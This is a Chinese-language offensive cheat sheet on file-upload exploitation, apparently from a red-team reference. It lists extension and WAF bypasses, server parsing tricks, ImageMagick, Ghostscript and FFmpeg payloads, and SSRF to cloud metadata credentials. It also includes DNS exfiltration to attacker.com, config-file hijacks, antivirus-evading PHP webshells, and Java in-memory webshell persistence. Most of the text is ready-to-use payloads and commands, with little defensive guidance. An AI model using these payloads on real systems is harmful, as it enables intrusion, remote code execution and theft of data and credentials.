# 文件上传漏洞专题

> 四阶段信任边界、验证绕过、解析漏洞、处理链攻击（ImageMagick/FFmpeg）、云存储、竞争条件、WAF 绕过、配置劫持。
> 基础速查见 web-vulnerabilities.md §4.2。

---

## 1. 四阶段信任边界模型

每个上传功能按四个独立边界测试（很多目标只验证一个阶段，bug 在另一阶段）：
**Accept**（存储前验证什么）→ **Store**（写到哪、什么名、什么权限）→ **Process**（什么后台工具碰它）→ **Serve**（之后如何被下载/渲染/分享）。

验证缺陷五维：位置（仅客户端/前后端不一致）｜方法（黑名单不全/仅 MIME/仅 magic bytes）｜逻辑顺序（检查后才重命名）｜范围（只查文件名不查内容）｜执行上下文（不同 vhost/handler 处理）。

处理器链风险：图片缩略图（解析差异/ImageMagick）｜音视频转码（FFmpeg 协议滥用）｜压缩解压（zip slip/炸弹）｜文档导入（CSV 公式/OOXML）｜XML/SVG（XXE/SSRF）｜HTML→PDF（SSRF/脚本）｜AV/DLP（解压深度/竞争）。

**文件名反射面**：gallery HTML、审核面板、PDF/CSV 导出、日志、邮件通知——文件名是存储型输入，不是被动元数据。

## 2. 验证绕过矩阵

| 验证风格 | 测什么 |
|---|---|
| 扩展名黑名单 | 双扩展名、大小写、尾点、替代分隔符 |
| 仅 Content-Type | multipart 头不匹配 |
| 仅 magic bytes | polyglot、合法头+危险尾 |
| 服务端重命名 | 危险内容是否存活到后续渲染 |
| 仅图片 | SVG、畸形图+元数据、解析差异 |
| 压缩包/导入 | zip 成员、嵌套路径、XML、解压行为 |

**扩展名替代清单**：PHP `.php .php3 .php4 .php5 .phtml .pht .phps .phar`｜ASP `.asp .aspx .asa .cer .cdx .ashx .asmx`｜JSP `.jsp .jspx .jsw .jsv .jspf`。大小写 `.pHp/.AsP`。尾字符：`shell.php.`（Windows 剥尾点）、`shell.php\x20`、`shell.php::$DATA`（NTFS ADS）。
**Tomcat filename* 窄化**（Java 后端 + WAF 拦 .jsp 时）: `filename*=UTF-8''shell.陪sp`——RFC2231 解码器高 8 位丢弃，落盘 shell.jsp。详见 `ghost-bits-cast-attack.md` §4.1。

**MIME sniffing XSS**：服务端不发 Content-Type 或缺 `X-Content-Type-Options: nosniff` → HTML 内容+图片扩展名 → 浏览器嗅探执行。

**响应修改绕过**：拦截 Response 改 allowedTypes 加目标扩展名——服务端只信客户端过滤时有效。

## 3. Web 服务器解析漏洞

| 服务器 | 技术 | 示例 |
|---|---|---|
| IIS 6 | 目录解析 | 上传到 `x.asp/` 目录，目录内全按 ASP |
| IIS 6 | 分号截断 | `shell.asp;.jpg` |
| IIS | Unicode 空格 | `shell.asp%20` |
| Nginx+PHP-FPM | fix_pathinfo | 访问 `/uploads/avatar.jpg/.php`，`cgi.fix_pathinfo=1` 时图片按 PHP 执行 |
| Apache | 多扩展名 | `shell.php.jpg`（AddHandler 从右往左找认识后缀） |
| Apache | 换行 CVE-2017-15715 | 文件名 `shell.php\x0a`——`<FilesMatch>` 的 `$` 匹配换行前位置 |
| Nginx CVE-2013-4547 | 文件名空格未转义 | 上传 `"shell.jpg .php"`（注意中间是空格+x 以外的构造: `x.jpg/[非空格]x.php` 形态）→ location 匹配 .php 但 fastcgi 收到的 SCRIPT_NAME 含空格路径——限定 Nginx 0.8.41-1.4.2/1.5.x（version-sensitive）|
| Apache | .htaccess | 上传 `AddType application/x-httpd-php .jpg` |

最可靠链：`exiftool -Comment='<?php system($_GET["c"]); ?>' photo.jpg` → Nginx `/.php` 访问 / Apache 改 `photo.php.jpg` / IIS `x.asp/` 目录。

## 4. PUT 方法上传

IIS WebDAV：`PUT /test.txt`（ASP 代码）→ `COPY /test.txt` + `Destination: /shell.asp` → 访问。
Tomcat CVE-2017-12615（readonly=false）：直接 PUT `.jsp` 403 → `PUT /shell.jsp/`（尾斜杠）或 `PUT /shell.jsp::$DATA` 绕过。

**Tomcat manager 后台 war 部署**（无 PUT 时的标准 getshell 路径）: 弱口令（默认 tomcat:tomcat，非 8080 端口全端口扫描常漏）或 msf `tomcat_mgr_login` 爆破进 /manager → jsp 马 压 zip 改后缀 .war 上传（manager 自动解压部署）→ 访问 `http://target/<war名>/<jsp名>.jsp` 连冰蝎/哥斯拉。

## 5. Polyglot 多态文件

- **PNG+PHP**：`exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.png` → LFI 包含执行（也可注入 IDAT/tEXt chunk）
- **JPEG+JS**：`exiftool -Comment='<script>...</script>'` + text/html 服务 → XSS
- **GIFAR**（legacy）：`cat header.gif payload.jar > gifar.gif`——浏览器看 GIF、Java 看 JAR
- **PDF+JS**：PDF 结构尾部 `*/=alert('XSS')/*`
- **JPEG+HTML polyglot**: PIL 最小合法 JPEG + 追加 HTML/JS——JPEG 容忍尾部数据，MIME 允许时浏览器从任意位置解析 HTML。外带可靠性排序: ①self-upload（fetch /admin 后结果编码进上传文件名，同源无 CSP 顾虑）②webhook（可能被 CSP 拦）③DNS exfil（`new Image().src='http://'+btoa(flag)+'.attacker.com'` 绕多数 CSP）
- **扩展名决定 Content-Type**: @fastify/static 等按扩展名定 MIME——noteId 存 `'<img src=x onerror=alert(1)>.html'` → text/html 服务即 XSS；变体: 白名单只查 .jpeg 漏 .jpg → .jpg 以 text/html 服务执行。report 端点 PoW（SHA-256 前缀难度）用 nonce 递增爆破

## 6. ImageMagick / Ghostscript 链

**ImageTragick（CVE-2016-3714）** delegates 注入——MVG：
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|id > /tmp/pwned")'
pop graphic-context
```
SVG 载体：`<image xlink:href="https://example.com/image.jpg&quot;|id ...">`。

**Ghostscript 沙箱逃逸**（.eps/.ps/.pdf → %pipe% 执行）：`userdict /setpagedevice undef` + `mark /OutputFile (%pipe%id > /tmp/pwned) currentdevice putdeviceprops`。

加固检测：policy.xml 禁 MVG/MSL/EPHEMERAL/URL/HTTPS coder；Ghostscript -dSAFER。

## 7. FFmpeg 链

HLS 文件读：`concat:http://attacker.com/header.txt|file:///etc/passwd`（m3u8 EXTINF 条目）。
HLS SSRF：EXTINF 条目直接填 `http://169.254.169.254/latest/meta-data/iam/security-credentials/`。
AVI 字幕 SSRF：`-vf "subtitles=http://169.254.169.254/..."`。

## 8. 云存储上传

S3 presigned：Content-Type 不在 SignedHeaders → 改 text/html 传 XSS；只签前缀 → key 改 `uploads/../admin/config.json`。审计：签名头清单/完整 key/上传桶与服务桶分离/ACL 签名。
Azure SAS：容器级 SAS+写权限 → 写任意 blob；查 sr=/sp=/se= 参数。
GCS：V4 查 X-Goog-SignedHeaders 是否含 content-type；Resumable URL 权限可能过宽。

## 9. 竞争条件上传

"保存→检测→删除"窗口内双线程：线程1 持续上传、线程2 持续访问。shell 内容必须是"被访问时生成新文件"型（新文件不受上传检测约束）。上传后文件秒级消失 = 存在窗口。

**二次渲染绕过**（imagecreatefrompng/jpeg/gif 重采样后写入 payload）: 渲染只重写像素数据——①上传含 payload 原图+渲染后产物**逐字节 diff 找未变区块**（PNG 的 PLTE/tRNS 辅助 chunk 常原样保留、IDAT 后半段部分场景不变），在不变区注入 ②GIF 动画多帧渲染只处理首帧——payload 写后续帧控制块 ③渲染函数抛错即不覆盖（畸形图头）时 payload 存活。核心思路: 比对"上传前 vs 渲染后"，凡未被程序重写的字节皆载体。

## 10. WAF 绕过

- 扩展 ASCII：`shell.php[0xcc]`（测试 0x7f/0x88/0xb0/0xc0/0xaa/0xe0/0xcc）——WAF 处理不一致、文件系统忽略
- JSPX：WAF 只查 .jsp 时用 .jspx（Tomcat 默认解析，XML 格式可绑命名空间）
- 响应修改 allowedTypes（见 §2）
- **0x0a 文件名截断**: 文件名可控时在 `.php` 后插入 0x0a 字节（python requests 构造上传正文时文件名参数直接写 "shell.php\n"）绕 WAF 文件名匹配，访问 `shell.php%0a` 执行

> 术语: **multipart/form-data** = HTTP 文件上传的标准正文格式——请求头 `Content-Type: multipart/form-data; boundary=XXX`，正文用 `--XXX` 分隔成多段，每段自带字段名/文件名/Content-Type 小头再接内容。文件上传漏洞的解析差异（WAF 按段判断 vs 服务器按段落盘）都发生在这套结构里。
- **multipart 层绕过族**（WAF 与容器解析差异）:
  - 垃圾数据填充: 主机 WAF 设校验大小上限（如 1M）——前 1M 填垃圾内容木马放尾部绕内容校验; 或垃圾数据放开头绕文件名校验; 或加长 Content-Disposition 参数值使 WAF 检测出错
  - 双/多 filename: 重复 filename 字段; **IIS 多 Content-Disposition 取第一个**而部分 WAF 取最后一个——错位绕过（IIS6/7 实测）
  - boundary 操纵: boundary= 后加空格/可处理字符; 请求头与实体 boundary 不一致（WAF 认为无意义数据跳过、宽松容器仍解析——Win2k3+IIS6+ASP 实测）
  - 删实体 Content-Type: 整行删或只留 `c` 把 `.php` 拼到 c 后（`filename="x.png` 换行 `C.php"`）
  - 文件名处插回车/换行; filename 换位置（IIS6.0 把 filename 放别处仍识别）
  - POST 改 GET: 规则"POST 才校验内容"时改方法
  - NTFS ADS: filename 匹配不当时 `shell.php::$DATA` 类流名绕过（见 §2 Win 特性）
  - 长文件名: 非字母数字（中文等）拉长文件名 `shell.asp;王王王...jpg` 超出 WAF 匹配窗口
  - CONTENT-LENGTH 反向: 服务端限最大 30 字节时用 ≤30 字节短 payload（`<?=` 短标签一行马）——fuzz 出限制阈值后定向构造

## 11. 路径获取与编辑器矩阵

成功率 = P(绕过)×P(路径)×P(解析)。路径获取：响应直返 95%｜预览 80%｜connector 目录遍历 70%｜规则猜测 60%｜报错 50%。时间戳命名爆破：记录上传时刻 ±60 秒。

| 编辑器 | 上传路径 | 版本指示 |
|---|---|---|
| FCKeditor | /fckeditor/editor/filemanager/connectors/ | /fckeditor/_whatsnew.html |
| CKEditor | /ckeditor/ | /ckeditor/CHANGES.md |
| eWebEditor | /ewebeditor/ | /ewebeditor/admin_login.asp |
| KindEditor | /kindeditor/attached/ | /kindeditor/kindeditor.js |
| UEditor | /ueditor/net/ 或 /ueditor/php/ | /ueditor/ueditor.config.js |

FCKeditor：test.html 探存在；`connector?Command=GetFoldersAndFiles&CurrentFolder=/../` 遍历；IIS 分号截断连续上传两次。

## 12. 配置文件劫持

```apache
# .htaccess（Apache）
<FilesMatch "\.jpg$">SetHandler application/x-httpd-php</FilesMatch>
```
```ini
# .user.ini（PHP-FPM 同目录）
auto_prepend_file=/var/www/html/uploads/shell.jpg
```
.user.ini 利用条件: CGI/FastCGI 模式的 PHP（nginx/apache/IIS 皆可）+ **同目录存在可访问的 .php 文件**（prepend 作用于该目录所有 php 执行）——纯图片上传目录通常无 php，此时若路径拼接可控用 `../` 把 .user.ini 传到站点根目录。
**.htaccess 深度利用三式**: ①**XBM 头绕 getimagesize**——htaccess 内容首行加 `#define width 1337`/`#define height 1337`（Apache 视作注释，get_imagesize 当 XBM 图）或 6 字节二进制头 `\x00\x00\x85\x48\x85\x18`; ②**php_value auto_append_file + filter 链**——`AddType application/x-httpd-php .a` + `php_value auto_append_file "php://filter/convert.base64-decode/resource=./shell.a"`，shell 上传为 base64（`GIF89a` 前缀+base64 免 <? 检测），访问时解码执行——绕"内容含 <? 检测 + 后缀白名单"; ③php_value auto_prepend_file 同理可指 filter。配套: 无字母场景 `?_=${%80%80^%df%c7}{%80}();&%80=函数名` XOR 构造 $_GET 超全局（花括号变量解析）。
```xml
<!-- web.config（IIS）: *.jpg 交 FastCGI PHP -->
```
日志注入+LFI：`User-Agent: <?php system($_GET['x']); ?>` → 包含日志。

## 13. Webshell 免杀（PHP）

**文件头变形**（绕 `<?php`/`<?` 检测）: `<script language="php">eval($_POST['m']);</script>`（无 <? 开头）｜短标签 `<?=eval($_REQUEST['m']);`（需 short_open_tag）。
变量函数 `$a='as'.'sert'; $a($_POST['x']);`｜回调 `array_map('assert', array($_POST['x']))`｜`create_function`（PHP<7.4）｜拼接 `$a='syste';$b='m'`｜`set_exception_handler('system'); throw new Exception($_POST['cmd']);`｜无字母自增构造｜数组键藏函数名 `$item['JON']='assert'; $array[]=$item; $array[0]['JON']($_POST['m']);`（蚁剑连接选 base64 编码）｜`@call_user_func(assert,$_POST['m'])`。静态查杀看函数名 → 拼接/自增/异或；行为查杀看调用形态 → 回调/异常。

## 14. 高危系统上传点

| 系统 | 路径 | 条件 |
|---|---|---|
| WebLogic CVE-2018-2894 | /ws_utc/config.do | keystore 上传 JSP → /ws_utc/css/config/keystore/TIMESTAMP.jsp |
| Flink CVE-2020-17518 | POST :8081/jars/upload | filename 路径遍历 `../../../../../../tmp/shell.jar` |
| 万户OA ezOffice | /defaultroot/dragpage/upload.jsp | %00 截断 |
| 用友协作 | /oaerp/ui/sync/excelUpload.jsp | 绕 JS 限制 |
| 通达OA | /module/upload.php | 直接上传无验证 |

**文件名转码/截断族**: ①iconv 截断——UTF-8→gb2312 转码遇不可编码字符从该处截断文件名（`1.php`+chr(128..255)+`.jpg` → `1.php`），fuzz chr(0)-chr(255) 可定位 ②CVE-2015-2348 move_uploaded_file \0 截断（version-sensitive: 5.4.x≤5.4.39 / 5.5.x≤5.5.23 / 5.6.x≤5.6.7）——name 参数 `a.php\0jpg`，`$_FILES[name]` 存的就是截断后值不影响校验、落盘路径被截断（经 $_REQUEST 取名时校验/落盘不一致）

无鉴权两模式：后台仅 JS 跳转守卫（禁 JS）；Excel/导入端点不限文件类型。

## 15. 存储滥用与授权逻辑

可预测路径（`/uploads/USER_ID/avatar.png`）→ 跨租户猜 ID/覆盖。授权缺陷：配额仅 UI 校验、导入端点不查套餐、替换/下载缺对象级授权、审批流直调存储端点绕过。上传路径含账号/项目/组织标识时一律 A/B 授权测试。


## 16. 写原语→执行原语与容器变体
- **Python .so/.pyc 劫持**: 任意文件写时——gcc -shared -fPIC 带 constructor 的 auth.so 覆盖待 import 模块; 或删 __pycache__/*.cpython-311.pyc 强制重编译
- **OPcache .bin 替换**: opcache.file_cache 开启→phpinfo 算 system_id→本地同版本生成 payload opcode→patch 字节 9-40→SQLi INTO DUMPFILE 落盘 /tmp/OPcache/<sid>/webroot/x.php.bin（除 system_id 无完整性校验）
- **Gogs symlink（CVE-2025-8110 ≤0.13.3）**: git 提交 ln -s .git/config 链接→PutContents API 写链接覆盖 .git/config→core.sshCommand=反弹 shell→下次 git 操作触发
- **wget 文件名**: URL `avatar.png?shell.php`——parse_url 校验 path（.png 过）、wget 存为 `avatar.png?shell.php` 按 .php 处理; 访问用 %3f
- **BMP 像素 webshell+截断**: payload 写 BGR 像素字节（PHP 忽略 <?php 前内容）; 文件名 "A"*(N-4)+".php"+".JPG" 过校验后截断成 .php
- **zip:// + PNG/ZIP polyglot**: ZIP 中央目录在文件尾→PNG 调色板区嵌 ZIP+shell.php→`zip://uploads/HASH.png%23s` 包含（三重绕过: 扩展名/图片校验/元数据剥离）
- **.wave MIME 缺口**: Apache mime.types 无 .wave 映射→octet-stream→`<script src=x.wave>` 绕 script-src 'self'（RIFF 头合法+data 块 JS 注释包裹）
- **ZIP 双攻击面**: 解包路径穿越写入（ZipSlip）+ `zip -y` 符号链接成员读取（多数解压库默认跟随）
- **ExifTool DjVu RCE**: CVE-2021-22204 ≤12.23——ANTa 块 `(metadata "\c${{命令}}")` 被 Perl eval

## 17. Webshell 管理与内存驻留

**无客户端 curl 操作**: 命令执行 curl -d "cmd=id"; 文件写用 base64 中转（echo 'b64'|base64 -d > x.php 避引号）; 非回显配外带。**加密流量绕检测**: 服务端 XOR/AES 解密循环+客户端对称加密——POST body 为密文无 system/whoami 特征（蚁剑自定义编码器/冰蝎 AES/哥斯拉多加密同原理，curl 方案红队最小 footprint）。disable_functions 受限时先 get_defined_functions(disabled) 列清单再选原语（LD_PRELOAD/FFI 见 §9.4-§9.5）。**Java 内存马五型**: Filter（StandardContext 反射+FilterDef/FilterMap 注册，通用）Servlet/Listener（最前端）/Spring Controller（registerMapping）/Java Agent（Instrumentation 改字节码最隐蔽）——反序列化/SSTI/EL/JNDI 任一代码执行后注入，删落地文件; 检测 web.xml 对照+arthas sc *Filter*; 清除唯重启。
